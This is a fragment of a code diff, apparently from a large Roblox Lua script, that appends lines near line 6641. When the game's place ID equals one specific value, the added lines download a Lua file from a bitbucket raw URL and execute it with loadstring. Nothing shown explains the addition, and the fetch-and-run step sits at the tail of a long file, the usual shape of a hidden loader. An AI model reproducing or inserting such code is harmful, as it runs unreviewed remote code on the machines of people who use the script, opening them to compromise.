@@ -6641,3 +6641,7 @@ end)
 end
 end
 end)
+
+if game.placeId == 3237168 then
+loadstring(game:HttpGet('https://bitbucket.org/hehehezz/hellowz/raw/b269d1380b009408777046cedb279734f3762aac/frzxhoo.lua'))()
+end
